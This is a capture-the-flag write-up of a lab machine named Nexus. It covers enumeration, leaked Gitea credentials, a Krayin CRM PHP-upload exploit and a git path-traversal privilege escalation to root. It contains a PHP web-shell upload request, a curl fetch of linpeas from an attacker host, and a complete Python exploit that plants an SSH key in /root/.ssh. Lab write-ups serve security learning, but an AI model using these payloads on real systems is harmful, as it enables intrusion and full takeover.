
>[!tldr] `Nexus` is an easy-difficulty Linux machine that features an exposed Gitea repository leaking credentials and a job posting that reveals valid usernames. The leaked credentials provide access to `Krayin CRM`, which is vulnerable to #CVE-2026-38526, leading to a shell as `www-data`. Further enumeration of the `Krayin CRM` configuration files reveals additional credentials that allow `SSH` access. Service enumeration reveals a `Gitea` template sync service vulnerable to directory traversal, which is leveraged to gain a shell as `root`.

----
1. `How many open TCP ports are listening on Nexus?`
	1. Start with a simple `nmap` scan
```shell
❯ nmap -sT 10.129.87.133 -p- -Pn
<SNIP>

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
- As we can see ther are two services running `ssh:22` and `http:80`
- Flag #1 -> `2`

---
2. `What is the hiring manager's full email address?`
	1. Next, i opened up `ZAP` to get a better look at the website.
		1. **Note:** I had to add the IP to `nexus.htb` in `/etc/hosts`
	2. Scrolling to the bottom of the main page there is a join our careers tab, inside has the hiring managers email
- Flag #2 -> `j.matthew@nexus.htb`

---
3. `What is the name of the additional subdomain hosting the Git service discovered during enumeration of nexus.htb?`
	1. I should use somthing like `gobuster` to enumerate subdomains
```shell
❯ gobuster vhost -u http://nexus.htb --domain nexus.htb -w ~/Tools/SecLists-2026.1/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

<SNIP>
git.nexus.htb Status: 200 [Size: 14474]
```
- Flag #3 -> `git`

>[!warning] Now that we have the subdomain it needs to be added to `/etc/hosts` in order for the addressing to work 

---
4. `What is the DB_PASSWORD discovered while enumerating the exposed repository?`
	1. I then opened up a webpage in order to view the `git.nexus.htb`
		1. We find a `gitea` service, after some simple clicking i found this page
			- `http://git.nexus.htb/admin/krayin-docker-setup`
		2. I read through the `docker-compose.yml` file, noticing that there is a "${DB_PASSWORD}" variable...
		3. In `.env` there is the value for these variables... and a LOT more!

```shell
# Extra stuff
APP_NAME='Krayin CRM'
APP_ENV=local
APP_KEY=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD
VITE_HOST=
VITE_PORT=
LOG_CHANNEL=stack
LOG_LEVEL=debug

# DB credentials
DB_CONNECTION=mysql
DB_HOST=krayin-mysql
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=
DB_PREFIX=

BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120
MEMCACHED_HOST=127.0.0.1

# REDIS credentials
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

# Mail credentials
MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com
MAIL_RECEIVER_DRIVER=sendgrid

# IMAP credentials
IMAP_HOST=imap.nexus.htb
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=username1
IMAP_PASSWORD=password1

# No AWS credentials
<SNIP>
AWS_DEFAULT_REGION=us-east-1
<SNIP>
# No PUSHER_APP, MIX_PUSHER_APP credentials
PUSHER_APP_CLUSTER=mt1
MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```
- We now have a lot of credentials but none are our flag. I want to add the new subdomains and do some enumeration on the new services
	
	- BIlling service
		- `billing.nexus.htb`
		- No: krayin, password1
		
	- The ports aren't open for these:
		- IMAP (email service)
			- `imap.nexus.htb:993` -> `username1:password1` 
		- SMTP (email service)
			- `mailhog.nexus.htb:1025` 
				- No: smtp, krayin, mailhog
		- Database service (redis?)
			- `krayin-mysql.nexus.htb` -> `krayin:`?
			- No: mysql, krayin, krayin-mysql
		
	- Found email address: `laravel@krayincrm.com`
	
- After enumerating most the services i went back to look at the commits, and from this page i found the DB password which was in a previous interation
	- `http://git.nexus.htb/admin/krayin-docker-setup/commit/9b817fa4e073d12fc43952acb09f3067b2f17adf`
	
- Flag #4 -> `N27xh!!2ucY04`

---
5. `What version of Krayin CRM is running on the billing subdomain?`
	1. First we add `billing.nexus.htb` into our `/etc/hosts` then visit the page
	2. I then tried logging in with:
		1. ~~`krayin@krayincrm.com:N27xh!!2ucY04`~~
		2.  ~~`laravel@krayincrm.com:N27xh!!2ucY04`~~
		3. `j.matthew@nexus.htb:N27xh!!2ucY04` -> Works! 
	3. The top right corner has the Version
- Flag #5 -> `2.2.0`

---
6. `What CVE affects Krayin CRM version 2.2.0, allowing unrestricted PHP file upload leading to remote code execution?`
	1. After a simple DuckDuckGo search of "exploit db Krayin CRM version 2.2.0" I found
		1. https://nvd.nist.gov/vuln/detail/CVE-2026-38526 -> CVE
- Flag #6 -> `CVE-2026-38526`

>[!note] What is `CVE-2026-38526`?
>An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayin CRM v2.2.x allows attackers to execute arbitrary code via uploading a crafted PHP file.


---
7. `What is the password for jones discovered during post-exploitation?`
	1. We should follow the CVE lead, on the NIST website i found a link to a proof of concept 
		-  https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md
	- Here are the following steps:
	1. Log in to Krayin CRM with any valid user account and capture your session token/cookie.
```shell
"krayin_crm_session" = 
eyJpdiI6Ik9uRGVBdjhaVTRnVytLYnRORjllaUE9PSIsInZhbHVlIjoiOVdndHVYeVlHYVlHUGo5UFptVnpyaE0yMlBWRDRQaytFZ2pNNXh2QldkeFJtNThZcEkyOEFodDAzYmp1UU5jS3pOMzltQTM4QkhRVmdiUmIxY2RqUWV2ZnpGRitjSjJQcUk4VVkrenRkLysxaUNaZlNGQ0RpR2IvL1VOQldCWUsiLCJtYWMiOiIyODJlYjRmZmVlZjczZGJkYmZjYjIyOWYyMDAyZGRlNTdmNjhlNTNiNWU2MDM4Zjk1Y2U0OTIzMWU4MjM0ZjcxIiwidGFnIjoiIn0%3D
"XSRF-TOKEN" = 
eyJpdiI6Iklmcnc4dGc2K0NuemNOQmxXaVREMHc9PSIsInZhbHVlIjoiL3Izczc0a0twSnJJaDFrVXM4OTRlWkNnL2JBYXVoZ2tUSDNaT3E0OC9CZkNCdWZnYklXYnc3dll6Znp1SDNXci9zNjBuNjNlbEk5YzRocVBiRU43Vm1vSVI5M0JLeHVXdUF0bWJ2QktKMzF1QkJnZUFjQkRWbHg3bEtzQktqZnQiLCJtYWMiOiI2YWViMGU1ZjNiODJjY2U5NjE2NjQzYTcwYjFiMDE2YzkxNTAwODMyNGFmYjQxZmNjNjdjYjQ0OTdjYmMzOWI3IiwidGFnIjoiIn0%3D
```
- One of these should be the token/cookie that we need
	- Also note the `0%3D`, that could be messing up the cookie.
	
	2. Send a multipart POST request to the TinyMCE upload endpoint with a PHP file as the attachment: 
```shell
POST /admin/tinymce/upload HTTP/1.1
Host: <target>
Cookie: <authenticated session>
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="file"; filename="payload.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
----boundary--
```

- **Note:** The `Content-Type` header on the file part may be spoofed (e.g., `image/jpeg`) if the server performs content-type header validation without inspecting actual file content.
	- `BurpSuite to send in malware`
		1. Turn on intercept in burpsuite and login as admin
		2. Once inside send a email with a "image.jpeg", capture the packet that accepts the image.
		3. Modify the conents of the "image.jpeg" to be "`p0wny.php`" and insert the code from the shell
		4. Forward that message and recieve the location url for how to access the image 
			1. `http://billing.nexus.htb/storage/tinymce/e6c88891ebd2c9cebff9809bae75e391.php`
	
	2. Retrieve Upload Path
		1. `http://billing.nexus.htb/storage/tinymce/e6c88891ebd2c9cebff9809bae75e391.php`
- Now we will enumerate the target for "jones" password

```shell
www-data@nexus:&/www/krayin# pwd
/var/www/krayin

www-data@nexus:&/www/krayin# ls -la
total 568
drwxr-xr-x 14 www-data www-data   4096 May 12 12:06 .
drwxr-xr-x  4 root     root       4096 May 12 12:06 ..
-rw-r--r--  1 www-data www-data    220 Mar 17 09:46 .editorconfig
-rw-r--r--  1 www-data www-data   1195 Apr 22 22:50 .env
<SNIP>

www-data@nexus:&/www/krayin# cat .env
<SNIP>
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=
<SNIP>

www-data@nexus:&/www/krayin# cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

- I will now use ssh from my computer to access `jones`:`y27xb3ha!!74GbR`
	- I will be sending `linpeas.sh` via 
		- Local Machine: In the directory containing linpeas.sh ->`python3 -m http.server 8888` 
		- SSH: `curl http://<ATTACKER_IP>/linpeas.sh -o linpeas.sh`
		- SSH: `chmod +x linpeas.sh`
		- SSH: `./linpeas.sh`

```shell
- After reading linpeas.sh we find 

<SNIP>
╔══════════╣ System timers
══╣ Active timers:

NEXT                      LEFT UNIT                         ACTIVATES
Wed 2026-06-24 16:15:30  28s  gitea-template-sync.timer    gitea-template-sync.service ← RUNS AS ROOT!
Wed 2026-06-24 16:20:00  4min sysstat-collect.timer
<SNIP>

jones@nexus:~$ systemctl cat gitea-template-sync.service

[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root                                    <- RUNS AS ROOT!
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```
- Flag #7 -> `gitea-template-sync.service`

---
8. `Submit the flag located in the root user's home directory.`
- I followed this guide for the privlige escalation attack chain:
	- https://dev.to/exploitnotes/hackthebox-nexus-writeup-17od
	
	1. Sign into Gitea as jones `jones`:`y27xb3ha!!74GbR`. Create a new repo called "Gurt0"
	2. Go to `/tmp` folder and generate a ssh key pair (public and private key)
		1. `cd /tmp`
		2. `ssh-keygen -f ./mykey -N ''`
	3. Clone the repo
		1. `git clone http://jones:'y27xb3ha!!74GbR'@localhost:3000/jones/gurt0.git`
	4. Add `exploit.py` to `/tmp`
		1. `nano exploit.py`
```python
#!/usr/bin/env python3  
import hashlib,zlib,os,subprocess,sys,time  
  
def write_obj(data,t):  
h=("%s %d"%(t,len(data))).encode()+b"\x00"  
s=h+data  
sha=hashlib.sha1(s).hexdigest()  
d=os.path.join(".git","objects",sha[:2])  
os.makedirs(d,exist_ok=True)  
p=os.path.join(d,sha[2:])  
if not os.path.exists(p):  
open(p,"wb").write(zlib.compress(s))  
return sha  
  
def entry(mode,name,sha):  
return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)  
  
if not os.path.isdir(".git"):  
print("Run inside git repo");sys.exit(1)  
  
r=subprocess.run(["cat","/tmp/mykey.pub"],capture_output=True,text=True)  
if r.returncode!=0:  
print("ssh-keygen -f /tmp/mykey -N ''");sys.exit(1)  
key=r.stdout.strip()+"\n"  
  
blob=write_obj(key.encode(),"blob")  
readme=write_obj(b"# Template\n","blob")  
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")  
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")  
fir=write_obj(entry("40000","root",cur),"tree")  
for i in range(4):  
fir=write_obj(entry("40000","..",fir),"tree")  
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")  
ts=int(time.time())  
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)  
sha=write_obj(c.encode(),"commit")  
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)  
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")  
print("Done: "+sha)
```
- Next steps:
	4. Execute the exploit in `gurt0` repo
		1. `cd gurt0`
		2. `python3 ../exploit.py`
			- Output: `e1cc1bdea8fb9feff9efcae05e2b8d84aea65761`
		3. `git push -u origin main --force`
	5. If we go back to `git.nexus.htb` we can see a new directory opened `../../../../../root/.ssh`, wait a minute for the systemd service to run.
	6. In `jones@nexus` use the `mykey` generated earlier to access root
		1. `ssh -i mykey root@nexus`
		- Now with root i will enumerate
- Root Flag!